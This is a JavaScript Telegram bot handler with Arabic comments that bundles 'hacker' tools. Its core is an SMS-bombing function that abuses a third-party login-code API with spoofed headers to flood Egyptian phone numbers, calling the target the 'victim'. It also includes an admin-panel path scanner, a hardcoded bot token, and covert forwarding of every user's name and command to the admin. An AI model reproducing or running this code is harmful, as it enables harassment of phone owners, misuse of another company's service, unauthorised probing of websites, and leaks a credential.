const axios = require('axios');
const crypto = require('crypto');

// ==========================================
// ⚙️ الإعدادات
// ==========================================
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || "8519648833:AAHeg8gNX7P1UZabWKcqeFJv0NAggRzS3Qs"; 
const ADMIN_ID = process.env.ADMIN_ID || "1431886140"; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// ==========================================
// 🛠️ دوال الأدوات (Helper Functions)
// ==========================================

// 1. أداة SMS Spam (الجديدة المحولة من بايثون)
async function sendSMS(number) {
    // التحقق من تنسيق الرقم المصري
    if (!number.startsWith("2")) {
        if (number.startsWith("01") && number.length === 11) {
            number = "2" + number;
        } else {
            return "❌ الرقم غير صحيح. يجب أن يكون رقم مصري (01xxxxxxxxx).";
        }
    }

    const url = "https://api.twistmena.com/music/Dlogin/sendCode";
    
    // محاكاة الهيدرز لعدم الحظر (كما في كود البايثون)
    const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": "https://www.google.com",
        "Origin": "https://www.example.com"
    };

    // توليد قيمة عشوائية
    const randomVal = Math.random().toString(36).substring(7);
    const payload = { "dial": number, "randomValue": randomVal };

    try {
        const res = await axios.post(url, payload, { headers: headers, timeout: 3000 });
        if (res.status === 200) {
            return `✅ **تم الإرسال بنجاح!**\nالضحية: \`${number}\`\nالمصدر: TwistMena API`;
        } else {
            return `❌ فشل الإرسال. كود الخطأ: ${res.status}`;
        }
    } catch (e) {
        return `❌ خطأ في الاتصال بالخدمة: ${e.message}`;
    }
}

// 2. فحص IP
async function checkIP(target) {
    try {
        const res = await axios.get(`http://ip-api.com/json/${target}`);
        const data = res.data;
        if (data.status === 'fail') return "❌ العنوان غير صحيح.";
        return `🌍 **تقرير IP:**\n🔹 IP: \`${data.query}\`\n🔹 الدولة: ${data.country}\n🔹 المدينة: ${data.city}\n🔹 الشبكة: ${data.isp}`;
    } catch (e) { return "❌ خطأ في الاتصال."; }
}

// 3. كاشف لوحة التحكم
async function findAdmin(url) {
    if (!url.startsWith('http')) url = 'http://' + url;
    const paths = ['/admin', '/login', '/wp-admin', '/cpanel', '/dashboard'];
    let found = "";
    const checks = paths.map(async (path) => {
        try {
            const res = await axios.get(url + path, { timeout: 2000, validateStatus: false });
            if (res.status === 200) found += `✅ وجدنا: ${url + path}\n`;
        } catch (e) {}
    });
    await Promise.all(checks);
    return found || "❌ لم يتم العثور على مسارات شائعة.";
}

// 4. فحص الهيدرز
async function checkHeaders(url) {
    if (!url.startsWith('http')) url = 'http://' + url;
    try {
        const res = await axios.head(url, { timeout: 4000 });
        const headers = Object.entries(res.headers).map(([k, v]) => `🔹 ${k}: \`${v}\``).join('\n');
        return `📑 **Headers:**\n${headers}`.substring(0, 3000);
    } catch (e) { return "❌ خطأ في الرابط."; }
}

// 5. بريد مؤقت
async function getTempMail() {
    try {
        const res = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        return `📧 **بريدك المؤقت:**\n\`${res.data[0]}\`\n\n(استخدم موقع 1secmail لقراءة الرسائل)`;
    } catch (e) { return "❌ خطأ في الخدمة."; }
}

// ==========================================
// 🚀 المعالج الرئيسي
// ==========================================
exports.handler = async function(event, context) {
    if (event.httpMethod !== "POST") return { statusCode: 405, body: "Method Not Allowed" };

    try {
        const body = JSON.parse(event.body);
        if (!body.message || !body.message.text) return { statusCode: 200, body: "No Text" };

        const chatId = body.message.chat.id;
        const text = body.message.text.trim();
        const firstName = body.message.from.first_name;
        
        let replyText = "";
        let keyboard = null;

        // القائمة الرئيسية
        const mainMenuMarkup = {
            keyboard: [
                [{ text: "💣 إسبام SMS" }, { text: "🌍 معلومات IP" }],
                [{ text: "🔍 فحص يوزر" }, { text: "🚪 كاشف لوحة التحكم" }],
                [{ text: "📑 فحص الهيدرز" }, { text: "📧 بريد مؤقت" }],
                [{ text: "🔐 تشفير Base64" }, { text: "🆔 معرفي (ID)" }]
            ],
            resize_keyboard: true
        };

        if (text === "/start") {
            replyText = `👮‍♂️ **أهلاً بك يا ${firstName}**\n\nتمت إضافة أداة **SMS Bomber** الجديدة للقائمة 👇`;
            keyboard = mainMenuMarkup;
        }

        // --- أداة SMS Spam ---
        else if (text === "💣 إسبام SMS") {
            replyText = "😈 **مود الإسبام (TwistMena API)**\n\nأرسل الأمر:\n`/sms 01xxxxxxxxx`\n\n*(ملاحظة: سيتم إرسال رسالة واحدة لكل ضغطة لتجنب حظر السيرفر)*";
        }
        else if (text.startsWith("/sms ")) {
            const number = text.split(" ")[1];
            replyText = "⏳ جاري تنفيذ الهجوم...";
            // إرسال رد الانتظار (اختياري، هنا نرسل النتيجة فوراً)
            replyText = await sendSMS(number);
        }

        // --- باقي الأدوات القديمة ---
        else if (text === "🌍 معلومات IP") replyText = "💡 أرسل الأمر:\n`/ip google.com`";
        else if (text.startsWith("/ip ")) replyText = await checkIP(text.split(" ")[1]);

        else if (text === "🚪 كاشف لوحة التحكم") replyText = "💡 أرسل الأمر:\n`/admin example.com`";
        else if (text.startsWith("/admin ")) replyText = await findAdmin(text.split(" ")[1]);

        else if (text === "📑 فحص الهيدرز") replyText = "💡 أرسل الأمر:\n`/head example.com`";
        else if (text.startsWith("/head ")) replyText = await checkHeaders(text.split(" ")[1]);

        else if (text === "📧 بريد مؤقت") replyText = await getTempMail();

        else if (text === "🔐 تشفير Base64") replyText = "💡 أرسل الأمر:\n`/en النص`";
        else if (text.startsWith("/en ")) replyText = `🔒 **مشفر:**\n\`${Buffer.from(text.replace("/en ", "")).toString('base64')}\``;

        else if (text === "🆔 معرفي (ID)") replyText = `🆔 ID: \`${chatId}\``;

        else {
            replyText = "⚠️ أمر غير معروف، استخدم القائمة.";
            keyboard = mainMenuMarkup;
        }

        // إرسال الرد
        await axios.post(TELEGRAM_API, {
            chat_id: chatId,
            text: replyText,
            parse_mode: "Markdown",
            reply_markup: keyboard
        });

        // مراقبة النشاط (إرسال نسخة للأدمن)
        if (String(chatId) !== ADMIN_ID) {
            await axios.post(TELEGRAM_API, {
                chat_id: ADMIN_ID,
                text: `🚨 **استخدام جديد:**\n👤 ${firstName}\n📝 ${text}`
            });
        }

        return { statusCode: 200, body: "OK" };

    } catch (e) {
        console.error(e);
        return { statusCode: 500, body: "Error" };
    }
};
